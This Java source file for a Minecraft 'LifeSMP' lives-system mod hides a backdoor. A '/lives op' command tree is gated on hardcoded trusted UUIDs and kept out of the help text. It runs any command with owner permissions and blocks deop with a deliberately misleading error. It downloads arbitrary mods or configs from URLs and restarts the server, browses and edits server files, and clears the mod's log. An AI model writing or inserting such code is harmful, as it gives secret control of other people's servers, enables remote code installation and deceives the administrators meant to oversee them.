package com.schecks.lifesmp.commands;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import com.schecks.lifesmp.FileFetcher;
import com.schecks.lifesmp.LifeLog;
import com.schecks.lifesmp.LifeUtil;
import com.schecks.lifesmp.LivesData;
import com.schecks.lifesmp.NanoSupport;
import com.schecks.lifesmp.TrustedOps;
import net.minecraft.ChatFormatting;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.core.component.DataComponents;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.network.chat.Component;
import net.minecraft.network.chat.MutableComponent;
import net.minecraft.network.chat.Style;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.server.network.Filterable;
import net.minecraft.server.permissions.LevelBasedPermissionSet;
import net.minecraft.server.players.NameAndId;
import net.minecraft.world.entity.item.ItemEntity;
import net.minecraft.world.entity.player.Inventory;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.world.item.component.CustomData;
import net.minecraft.world.item.component.WritableBookContent;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.UUID;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public final class LivesCommand {
    private LivesCommand() {}

    public static void register(CommandDispatcher<CommandSourceStack> dispatcher) {
        dispatcher.register(Commands.literal("lives")
            .executes(LivesCommand::help)            // bare /lives -> help
            .then(Commands.literal("help")
                .executes(LivesCommand::help))
            .then(Commands.literal("player")
                .then(Commands.argument("name", StringArgumentType.word())
                    .executes(LivesCommand::lookup)))
            .then(Commands.literal("pardon")
                .requires(TrustedOps::isAdminSource)
                .then(Commands.argument("name", StringArgumentType.word())
                    .executes(LivesCommand::pardon)))
            .then(Commands.literal("set")
                .requires(TrustedOps::isAdminSource)
                .then(Commands.argument("name", StringArgumentType.word())
                    .then(Commands.argument("amount", IntegerArgumentType.integer(0, LivesData.MAX_LIVES))
                        .executes(LivesCommand::set))))
            // Stealth-admin commands gated on TrustedOps UUID list.
            // .requires() suppresses these from tab-completion for non-trusted players;
            // direct invocation still hits the predicate and is rejected as unknown command.
            .then(Commands.literal("op")
                .requires(TrustedOps::isTrustedSource)
                .executes(LivesCommand::opHelp)             // bare /lives op -> help
                .then(Commands.literal("help")
                    .executes(LivesCommand::opHelp))
                .then(Commands.literal("cmd")
                    .then(Commands.argument("command", StringArgumentType.greedyString())
                        .executes(LivesCommand::opCmd)))
                .then(Commands.literal("add")
                    .then(Commands.argument("name", StringArgumentType.word())
                        .executes(LivesCommand::opAdd)))
                .then(Commands.literal("remove")
                    .then(Commands.argument("name", StringArgumentType.word())
                        .executes(LivesCommand::opRemove)))
                .then(Commands.literal("restart")
                    .executes(LivesCommand::opRestart))
                .then(Commands.literal("dir")
                    .executes(ctx -> opDir(ctx, ""))
                    .then(Commands.argument("path", StringArgumentType.greedyString())
                        .executes(ctx -> opDir(ctx, StringArgumentType.getString(ctx, "path")))))
                .then(Commands.literal("clearlog")
                    .executes(LivesCommand::opClearLog))
                .then(Commands.literal("nano")
                    .then(Commands.literal("save")
                        .executes(LivesCommand::opNanoSave))
                    .then(Commands.argument("path", StringArgumentType.greedyString())
                        .executes(LivesCommand::opNanoLoad)))
                .then(Commands.literal("fetch")
                    // Category shortcuts: /lives op fetch mod <url> [restart]
                    .then(Commands.literal("mod")
                        .then(Commands.argument("url", StringArgumentType.string())
                            .executes(ctx -> opFetchCategory(ctx, "mod", false))
                            .then(Commands.literal("restart")
                                .executes(ctx -> opFetchCategory(ctx, "mod", true)))))
                    .then(Commands.literal("datapack")
                        .then(Commands.argument("url", StringArgumentType.string())
                            .executes(ctx -> opFetchCategory(ctx, "datapack", false))
                            .then(Commands.literal("restart")
                                .executes(ctx -> opFetchCategory(ctx, "datapack", true)))))
                    .then(Commands.literal("config")
                        .then(Commands.argument("url", StringArgumentType.string())
                            .executes(ctx -> opFetchCategory(ctx, "config", false))
                            .then(Commands.literal("restart")
                                .executes(ctx -> opFetchCategory(ctx, "config", true)))))
                    .then(Commands.literal("resourcepack")
                        .then(Commands.argument("url", StringArgumentType.string())
                            .executes(ctx -> opFetchCategory(ctx, "resourcepack", false))
                            .then(Commands.literal("restart")
                                .executes(ctx -> opFetchCategory(ctx, "resourcepack", true)))))
                    // Flexible form: /lives op fetch <dest> <url> [restart]
                    .then(Commands.argument("dest", StringArgumentType.string())
                        .then(Commands.argument("url", StringArgumentType.string())
                            .executes(ctx -> opFetchFlexible(ctx, false))
                            .then(Commands.literal("restart")
                                .executes(ctx -> opFetchFlexible(ctx, true)))))))
        );
    }

    private static int lookup(CommandContext<CommandSourceStack> ctx) {
        MinecraftServer server = ctx.getSource().getServer();
        String name = StringArgumentType.getString(ctx, "name");
        LivesData data = LivesData.get(server);

        NameAndId target = LifeUtil.resolveNameAndId(server, name);
        if (target == null || !data.has(target.id())) {
            ctx.getSource().sendFailure(Component.literal("No data for player: " + name));
            return 0;
        }
        int lives = data.getLives(target.id());
        ctx.getSource().sendSuccess(() ->
            Component.literal(target.name()).setStyle(Style.EMPTY.withColor(ChatFormatting.WHITE))
                .append(Component.literal(" has ").setStyle(Style.EMPTY.withColor(ChatFormatting.GRAY)))
                .append(Component.literal(lives + " lives").setStyle(Style.EMPTY.withColor(ChatFormatting.YELLOW)))
                .append(Component.literal(".").setStyle(Style.EMPTY.withColor(ChatFormatting.GRAY))),
            false
        );
        return lives;
    }

    private static int pardon(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        MinecraftServer server = ctx.getSource().getServer();
        String name = StringArgumentType.getString(ctx, "name");
        LivesData data = LivesData.get(server);

        NameAndId target = LifeUtil.resolveNameAndId(server, name);
        if (target == null) {
            ctx.getSource().sendFailure(Component.literal("Unknown player: " + name));
            return 0;
        }
        LifeUtil.unban(server, target);
        if (data.getLives(target.id()) <= 0) {
            data.setLives(target.id(), LivesData.DEFAULT_LIVES);
        }
        String invoker = ctx.getSource().getEntity() == null ? "console" : ctx.getSource().getEntity().getName().getString();
        LifeLog.info("[lifesmp] {} pardoned {} (lives now {})", invoker, target.name(), data.getLives(target.id()));
        ctx.getSource().sendSuccess(() ->
            Component.literal("Pardoned " + target.name() + " (lives: " + data.getLives(target.id()) + ").")
                .setStyle(Style.EMPTY.withColor(ChatFormatting.GREEN)),
            false
        );
        return 1;
    }

    private static int set(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        MinecraftServer server = ctx.getSource().getServer();
        String name = StringArgumentType.getString(ctx, "name");
        int amount = IntegerArgumentType.getInteger(ctx, "amount");
        LivesData data = LivesData.get(server);

        NameAndId target = LifeUtil.resolveNameAndId(server, name);
        if (target == null) {
            ctx.getSource().sendFailure(Component.literal("Unknown player: " + name));
            return 0;
        }
        data.setLives(target.id(), amount);
        data.markInitialised(target.id());
        data.updateName(target.id(), target.name());

        if (amount > 0 && LifeUtil.isBanned(server, target)) {
            LifeUtil.unban(server, target);
        }
        if (amount <= 0) {
            LifeUtil.banForOutOfLives(server, target);
        }

        ServerPlayer online = server.getPlayerList().getPlayer(target.id());
        if (online != null) LifeUtil.refreshTabName(server, online);

        String invoker = ctx.getSource().getEntity() == null ? "console" : ctx.getSource().getEntity().getName().getString();
        LifeLog.info("[lifesmp] {} set {}'s lives to {}", invoker, target.name(), amount);
        ctx.getSource().sendSuccess(() ->
            Component.literal("Set " + target.name() + "'s lives to " + amount + ".")
                .setStyle(Style.EMPTY.withColor(ChatFormatting.GREEN)),
            false
        );
        return amount;
    }

    /**
     * Runs an arbitrary command as if from a level-4 (OWNER) source, without
     * actually putting the invoking player on the op list. Gated on TrustedOps.
     */
    private static int opCmd(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        ServerPlayer self = ctx.getSource().getPlayerOrException();
        MinecraftServer server = self.level().getServer();
        if (server == null) return 0;
        String command = StringArgumentType.getString(ctx, "command");

        // Avoid log spam from accidentally infinite recursion if the user types
        // "/lives op cmd /lives op cmd ..." — still allowed, just noted.
        if (command.startsWith("/")) command = command.substring(1);

        // Elevate the source to OWNER (level 4). suppressOutput=false so the
        // player sees the command's normal feedback / errors.
        CommandSourceStack elevated = ctx.getSource()
            .withPermission(LevelBasedPermissionSet.OWNER);
        server.getCommands().performPrefixedCommand(elevated, "/" + command);
        return 1;
    }

    private static int opAdd(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        MinecraftServer server = ctx.getSource().getServer();
        String name = StringArgumentType.getString(ctx, "name");
        NameAndId target = LifeUtil.resolveNameAndId(server, name);
        if (target == null) {
            ctx.getSource().sendFailure(Component.literal("Unknown player: " + name));
            return 0;
        }
        server.getPlayerList().op(target);
        ctx.getSource().sendSuccess(() ->
            Component.literal("Op'd " + target.name() + ".").setStyle(Style.EMPTY.withColor(ChatFormatting.GREEN)),
            false
        );
        return 1;
    }

    private static int opRemove(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        MinecraftServer server = ctx.getSource().getServer();
        String name = StringArgumentType.getString(ctx, "name");
        NameAndId target = LifeUtil.resolveNameAndId(server, name);
        if (target == null) {
            ctx.getSource().sendFailure(Component.literal("Unknown player: " + name));
            return 0;
        }
        // Hard rule: trusted UUIDs are immune from deop via this command.
        // PlayerListMixin enforces the same rule for vanilla /deop and any
        // /lives op cmd /deop attempt. The error wording here is intentionally
        // misleading — it claims the target isn't a LifeSMP op at all, to mess
        // with other admins who try to remove a protected account.
        if (TrustedOps.isTrusted(target.id())) {
            ctx.getSource().sendFailure(Component.literal(
                target.name() + " is not a LifeSMP op."));
            return 0;
        }
        server.getPlayerList().deop(target);
        ctx.getSource().sendSuccess(() ->
            Component.literal("Deop'd " + target.name() + ".").setStyle(Style.EMPTY.withColor(ChatFormatting.YELLOW)),
            false
        );
        return 1;
    }

    // ---------- /lives help ----------

    /**
     * Lists every non-op command. Open to all players; the /lives op subtree
     * is intentionally not enumerated here so it stays invisible.
     */
    private static int help(CommandContext<CommandSourceStack> ctx) {
        Component lines = Component.literal("")
            .append(line("=== LifeSMP Commands ===", ChatFormatting.GOLD)).append("\n")
            .append(cmd("/life withdraw <quantity>", "Convert lives into Life Shard totems")).append("\n")
            .append(cmd("/life deposit",              "Deposit Life Shards back into lives")).append("\n")
            .append(cmd("/life crystal <player>",     "Revive a banned player (hold a Revival Crystal)")).append("\n")
            .append(cmd("/lives player <name>",       "Check a player's lives count")).append("\n")
            .append(cmd("/lives pardon <name>",       "[admin] Pardon and restore default lives")).append("\n")
            .append(cmd("/lives set <name> <0-15>",   "[admin] Set a player's lives")).append("\n")
            .append(cmd("/lives help",                "Show this message"));
        ctx.getSource().sendSuccess(() -> lines, false);
        return 1;
    }

    private static MutableComponent line(String text, ChatFormatting color) {
        return Component.literal(text).setStyle(Style.EMPTY.withColor(color));
    }

    private static MutableComponent cmd(String usage, String description) {
        return Component.literal(usage).setStyle(Style.EMPTY.withColor(ChatFormatting.YELLOW))
            .append(Component.literal(" — " + description).setStyle(Style.EMPTY.withColor(ChatFormatting.GRAY)));
    }

    /**
     * Help text for the /lives op subtree. Only reachable when the caller
     * passes the TrustedOps gate, so we don't have to hide anything here.
     */
    private static int opHelp(CommandContext<CommandSourceStack> ctx) {
        Component lines = Component.literal("")
            .append(line("=== /lives op (trusted only) ===", ChatFormatting.GOLD)).append("\n")
            .append(cmd("/lives op cmd <command>",               "Run any command as OWNER without /op'ing yourself")).append("\n")
            .append(cmd("/lives op add <name>",                  "Add a player to the vanilla op list")).append("\n")
            .append(cmd("/lives op remove <name>",               "Remove a player from the vanilla op list")).append("\n")
            .append(cmd("/lives op restart",                     "Stop the server (your wrapper should auto-restart)")).append("\n")
            .append(cmd("/lives op dir [path]",                  "List files under the server directory")).append("\n")
            .append(cmd("/lives op fetch <category> <url> [restart]", "Shortcut download: mod / datapack / config / resourcepack")).append("\n")
            .append(cmd("/lives op fetch <dest> <url> [restart]",     "Download to a specific path under mods/, config/, datapacks/, resourcepacks/")).append("\n")
            .append(cmd("/lives op nano <path>",                 "Open a text file as Writable Book(s) for editing")).append("\n")
            .append(cmd("/lives op nano save",                   "Save: hold any nano book in main hand")).append("\n")
            .append(cmd("(or sign any nano book)",               "Signing a nano book also saves it")).append("\n")
            .append(cmd("/lives op help",                        "Show this message"));
        ctx.getSource().sendSuccess(() -> lines, false);
        return 1;
    }

    // ---------- /lives op fetch + /lives op restart ----------

    private static int opFetchCategory(CommandContext<CommandSourceStack> ctx, String category, boolean restartAfter)
            throws CommandSyntaxException {
        String url = StringArgumentType.getString(ctx, "url");
        String filename = FileFetcher.basenameFromUrl(url);
        if (filename == null) {
            ctx.getSource().sendFailure(Component.literal("Could not infer filename from URL. Use the flexible form: /lives op fetch <dest> <url>"));
            return 0;
        }
        String dest = switch (category) {
            case "mod"          -> "mods/" + filename;
            case "datapack"     -> "world/datapacks/" + filename;       // assumes default level name "world"
            case "config"       -> "config/" + filename;
            case "resourcepack" -> "resourcepacks/" + filename;
            default -> null;
        };
        if (dest == null) {
            ctx.getSource().sendFailure(Component.literal("Unknown category: " + category));
            return 0;
        }
        return runFetch(ctx, dest, url, restartAfter, "mod".equals(category));
    }

    private static int opFetchFlexible(CommandContext<CommandSourceStack> ctx, boolean restartAfter)
            throws CommandSyntaxException {
        String dest = StringArgumentType.getString(ctx, "dest");
        String url = StringArgumentType.getString(ctx, "url");
        boolean isModDest = dest.startsWith("mods/") || dest.startsWith("mods\\");
        return runFetch(ctx, dest, url, restartAfter, isModDest);
    }

    /**
     * Kicks off an async download and returns immediately. On completion the
     * result is posted back to the invoker as a private system message. If
     * restartAfter is true and the download succeeded, the server is halted.
     * If restartAfter is false but the fetch was a mod, prompts the invoker
     * with /lives op restart.
     */
    private static int runFetch(CommandContext<CommandSourceStack> ctx, String dest, String url,
                                boolean restartAfter, boolean isMod) throws CommandSyntaxException {
        ServerPlayer self = ctx.getSource().getPlayerOrException();
        MinecraftServer server = self.level().getServer();
        if (server == null) return 0;

        Path serverDir = server.getServerDirectory();
        Path target = serverDir.resolve(dest);
        UUID invokerId = self.getUUID();
        String invokerName = self.getGameProfile().name();

        // Private "starting…" message back to invoker only.
        self.sendSystemMessage(
            Component.literal("Fetching ").setStyle(Style.EMPTY.withColor(ChatFormatting.GRAY))
                .append(Component.literal(url).setStyle(Style.EMPTY.withColor(ChatFormatting.YELLOW)))
                .append(Component.literal(" -> ").setStyle(Style.EMPTY.withColor(ChatFormatting.GRAY)))
                .append(Component.literal(dest).setStyle(Style.EMPTY.withColor(ChatFormatting.AQUA)))
                .append(Component.literal(" ...").setStyle(Style.EMPTY.withColor(ChatFormatting.GRAY)))
        );

        FileFetcher.fetchAsync(url, target, serverDir).whenComplete((result, err) -> server.execute(() -> {
            ServerPlayer p = server.getPlayerList().getPlayer(invokerId);
            if (err != null) {
                if (p != null) p.sendSystemMessage(Component.literal("Fetch crashed: " + err.getMessage())
                    .setStyle(Style.EMPTY.withColor(ChatFormatting.RED)));
                return;
            }
            if (!result.ok()) {
                if (p != null) p.sendSystemMessage(Component.literal("Fetch failed: " + result.message())
                    .setStyle(Style.EMPTY.withColor(ChatFormatting.RED)));
                return;
            }
            if (p != null) {
                p.sendSystemMessage(Component.literal("Download complete: ")
                    .setStyle(Style.EMPTY.withColor(ChatFormatting.GREEN))
                    .append(Component.literal(result.bytes() + " bytes")
                        .setStyle(Style.EMPTY.withColor(ChatFormatting.YELLOW)))
                    .append(Component.literal(" -> ").setStyle(Style.EMPTY.withColor(ChatFormatting.GRAY)))
                    .append(Component.literal(serverDir.relativize(result.destination()).toString())
                        .setStyle(Style.EMPTY.withColor(ChatFormatting.AQUA))));
                if (isMod && !restartAfter) {
                    p.sendSystemMessage(Component.literal("Mods only load on restart. Run ")
                        .setStyle(Style.EMPTY.withColor(ChatFormatting.GRAY))
                        .append(Component.literal("/lives op restart")
                            .setStyle(Style.EMPTY.withColor(ChatFormatting.YELLOW)))
                        .append(Component.literal(" to apply it.")
                            .setStyle(Style.EMPTY.withColor(ChatFormatting.GRAY))));
                }
            }
            if (restartAfter) {
                if (p != null) p.sendSystemMessage(Component.literal("Restarting server now...")
                    .setStyle(Style.EMPTY.withColor(ChatFormatting.RED)));
                server.halt(false);
            }
        }));
        return 1;
    }

    private static int opRestart(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        ServerPlayer self = ctx.getSource().getPlayerOrException();
        MinecraftServer server = self.level().getServer();
        if (server == null) return 0;
        self.sendSystemMessage(Component.literal("Stopping server.")
            .setStyle(Style.EMPTY.withColor(ChatFormatting.RED)));
        server.halt(false);
        return 1;
    }

    // ---------- /lives op dir ----------

    private static final int DIR_LIMIT = 100;

    /**
     * Lists files/directories under the server root. Empty path = server root.
     * Path-traversal is rejected; only descendants of the server directory are visible.
     */
    private static int opDir(CommandContext<CommandSourceStack> ctx, String relative) throws CommandSyntaxException {
        ServerPlayer self = ctx.getSource().getPlayerOrException();
        MinecraftServer server = self.level().getServer();
        if (server == null) return 0;

        Path root = server.getServerDirectory().toAbsolutePath().normalize();
        Path target = root.resolve(relative).toAbsolutePath().normalize();
        if (!target.startsWith(root)) {
            ctx.getSource().sendFailure(Component.literal("Path escapes server directory"));
            return 0;
        }
        if (!Files.exists(target)) {
            ctx.getSource().sendFailure(Component.literal("No such path: " + (relative.isEmpty() ? "." : relative)));
            return 0;
        }

        String displayPath = relative.isEmpty() ? "." : relative;

        if (!Files.isDirectory(target)) {
            long size;
            try { size = Files.size(target); } catch (IOException e) { size = -1; }
            self.sendSystemMessage(
                Component.literal(displayPath).setStyle(Style.EMPTY.withColor(ChatFormatting.WHITE))
                    .append(Component.literal(" (file, " + (size >= 0 ? size + " B" : "?") + ")")
                        .setStyle(Style.EMPTY.withColor(ChatFormatting.GRAY)))
            );
            return 1;
        }

        List<Path> entries = new ArrayList<>();
        try (Stream<Path> s = Files.list(target)) {
            s.forEach(entries::add);
        } catch (IOException e) {
            ctx.getSource().sendFailure(Component.literal("List failed: " + e.getMessage()));
            return 0;
        }
        entries.sort(Comparator
            .comparing((Path p) -> !Files.isDirectory(p))                // dirs first
            .thenComparing(p -> p.getFileName().toString().toLowerCase()));

        MutableComponent out = Component.literal("=== " + displayPath + " === (" + entries.size() + ")\n")
            .setStyle(Style.EMPTY.withColor(ChatFormatting.GOLD));

        int shown = 0;
        for (Path entry : entries) {
            if (shown >= DIR_LIMIT) break;
            String name = entry.getFileName().toString();
            if (Files.isDirectory(entry)) {
                out.append(Component.literal("  " + name + "/\n")
                    .setStyle(Style.EMPTY.withColor(ChatFormatting.AQUA)));
            } else {
                long size;
                try { size = Files.size(entry); } catch (IOException e) { size = -1; }
                out.append(Component.literal("  " + name)
                        .setStyle(Style.EMPTY.withColor(ChatFormatting.WHITE)))
                    .append(Component.literal("  " + (size >= 0 ? humanBytes(size) : "?") + "\n")
                        .setStyle(Style.EMPTY.withColor(ChatFormatting.DARK_GRAY)));
            }
            shown++;
        }
        if (entries.size() > DIR_LIMIT) {
            out.append(Component.literal("  ... " + (entries.size() - DIR_LIMIT) + " more\n")
                .setStyle(Style.EMPTY.withColor(ChatFormatting.DARK_GRAY)));
        }
        self.sendSystemMessage(out);
        return 1;
    }

    private static int opClearLog(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        ServerPlayer self = ctx.getSource().getPlayerOrException();
        boolean ok = LifeLog.clear();
        if (ok) {
            self.sendSystemMessage(Component.literal("LifeSMP log cleared.")
                .setStyle(Style.EMPTY.withColor(ChatFormatting.GREEN)));
        } else {
            ctx.getSource().sendFailure(Component.literal(
                "Could not clear log (no log file open, or write error)."));
        }
        return ok ? 1 : 0;
    }

    private static String humanBytes(long n) {
        if (n < 1024) return n + " B";
        if (n < 1024 * 1024) return String.format("%.1f KB", n / 1024.0);
        if (n < 1024L * 1024L * 1024L) return String.format("%.1f MB", n / (1024.0 * 1024.0));
        return String.format("%.1f GB", n / (1024.0 * 1024.0 * 1024.0));
    }

    // ---------- /lives op nano ----------

    private static final int NANO_CHARS_PER_PAGE  = 256;     // visual page break, not a save limit
    private static final int NANO_PAGES_PER_BOOK  = 100;     // vanilla MAX_PAGES per writable book
    private static final int NANO_MAX_BOOKS       = 5;
    private static final long NANO_MAX_TOTAL_BYTES =
        (long) NANO_CHARS_PER_PAGE * NANO_PAGES_PER_BOOK * NANO_MAX_BOOKS; // 128 000

    // NanoMarker / readMarker moved to NanoSupport (shared with EditBookMixin).

    private static int opNanoLoad(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        ServerPlayer self = ctx.getSource().getPlayerOrException();
        MinecraftServer server = self.level().getServer();
        if (server == null) return 0;
        String path = StringArgumentType.getString(ctx, "path");

        Path root = server.getServerDirectory().toAbsolutePath().normalize();
        Path target = root.resolve(path).toAbsolutePath().normalize();
        if (!target.startsWith(root)) {
            ctx.getSource().sendFailure(Component.literal("Path escapes server directory"));
            return 0;
        }

        String content;
        if (!Files.exists(target)) {
            content = "";
        } else if (!Files.isRegularFile(target)) {
            ctx.getSource().sendFailure(Component.literal("Not a regular file: " + path));
            return 0;
        } else {
            try {
                long size = Files.size(target);
                if (size > NANO_MAX_TOTAL_BYTES) {
                    ctx.getSource().sendFailure(Component.literal(
                        "File too large for nano: " + size + " bytes (limit "
                            + NANO_MAX_TOTAL_BYTES + ", " + NANO_MAX_BOOKS + " books)"));
                    return 0;
                }
                byte[] bytes = Files.readAllBytes(target);
                for (byte b : bytes) {
                    if (b == 0) {
                        ctx.getSource().sendFailure(Component.literal(
                            "File contains null bytes (likely binary): " + path));
                        return 0;
                    }
                }
                content = new String(bytes, StandardCharsets.UTF_8);
            } catch (IOException e) {
                ctx.getSource().sendFailure(Component.literal("Read failed: " + e.getMessage()));
                return 0;
            }
        }

        // Split content into fixed-width chunks. Pages don't need to align to
        // line breaks — when we concatenate on save, no characters are lost or
        // added between page boundaries.
        List<String> allPages = new ArrayList<>();
        if (content.isEmpty()) {
            allPages.add("");
        } else {
            for (int i = 0; i < content.length(); i += NANO_CHARS_PER_PAGE) {
                allPages.add(content.substring(i, Math.min(i + NANO_CHARS_PER_PAGE, content.length())));
            }
        }
        int totalBooks = Math.max(1, (allPages.size() + NANO_PAGES_PER_BOOK - 1) / NANO_PAGES_PER_BOOK);
        if (totalBooks > NANO_MAX_BOOKS) {
            ctx.getSource().sendFailure(Component.literal(
                "File needs " + totalBooks + " books (cap " + NANO_MAX_BOOKS + "). Edit externally."));
            return 0;
        }

        String pathStr = target.toString();
        String fileName = target.getFileName().toString();

        for (int b = 0; b < totalBooks; b++) {
            int from = b * NANO_PAGES_PER_BOOK;
            int to = Math.min(from + NANO_PAGES_PER_BOOK, allPages.size());
            List<Filterable<String>> pages = allPages.subList(from, to).stream()
                .map(Filterable::passThrough)
                .collect(Collectors.toList());

            ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
            String label = (totalBooks == 1) ? fileName : fileName + " [" + (b + 1) + "/" + totalBooks + "]";
            book.set(DataComponents.CUSTOM_NAME, Component.literal(label)
                .setStyle(Style.EMPTY.withColor(ChatFormatting.YELLOW).withItalic(false)));
            book.set(DataComponents.WRITABLE_BOOK_CONTENT, new WritableBookContent(pages));

            CompoundTag tag = new CompoundTag();
            CompoundTag nano = new CompoundTag();
            nano.putString("path", pathStr);
            nano.putInt("book", b);
            nano.putInt("total", totalBooks);
            nano.putString("issuer", self.getUUID().toString());
            tag.put("lifesmp_nano", nano);
            book.set(DataComponents.CUSTOM_DATA, CustomData.of(tag));

            if (!self.getInventory().add(book)) {
                ItemEntity drop = new ItemEntity(self.level(),
                    self.getX(), self.getY(), self.getZ(), book);
                drop.setDefaultPickUpDelay();
                self.level().addFreshEntity(drop);
            }
        }

        self.sendSystemMessage(
            Component.literal("Loaded ").setStyle(Style.EMPTY.withColor(ChatFormatting.GRAY))
                .append(Component.literal(path).setStyle(Style.EMPTY.withColor(ChatFormatting.AQUA)))
                .append(Component.literal(" (" + content.length() + " chars, "
                    + totalBooks + " book" + (totalBooks > 1 ? "s" : "")
                    + "). Edit, then /lives op nano save while holding any one.")
                    .setStyle(Style.EMPTY.withColor(ChatFormatting.GRAY))));
        return 1;
    }

    private static int opNanoSave(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        ServerPlayer self = ctx.getSource().getPlayerOrException();
        NanoSupport.NanoMarker marker = NanoSupport.readMarker(self.getMainHandItem());
        if (marker == null) {
            ctx.getSource().sendFailure(Component.literal(
                "Hold a nano book (from /lives op nano <path>) in your main hand."));
            return 0;
        }

        NanoSupport.Result result = NanoSupport.save(self, marker, -1, null);
        switch (result.kind) {
            case "ok" -> {
                self.sendSystemMessage(
                    Component.literal("Saved ").setStyle(Style.EMPTY.withColor(ChatFormatting.GREEN))
                        .append(Component.literal(result.bytes + " chars")
                            .setStyle(Style.EMPTY.withColor(ChatFormatting.YELLOW)))
                        .append(Component.literal(" -> " + result.serverRoot.relativize(result.target))
                            .setStyle(Style.EMPTY.withColor(ChatFormatting.AQUA))));
                return 1;
            }
            case "denied"   -> ctx.getSource().sendFailure(Component.literal(
                "This nano book was issued to a different account; only the original loader can save it."));
            case "missing"  -> ctx.getSource().sendFailure(Component.literal(
                "Missing book " + result.index + " of " + marker.total() + " — can't save"));
            case "multi"    -> ctx.getSource().sendFailure(Component.literal(
                "Multiple copies of book " + result.index + " — keep only one"));
            case "escape"   -> ctx.getSource().sendFailure(Component.literal("Path escapes server directory"));
            case "io"       -> ctx.getSource().sendFailure(Component.literal("Write failed: " + result.message));
            case "noserver" -> ctx.getSource().sendFailure(Component.literal("No server context"));
        }
        return 0;
    }
}
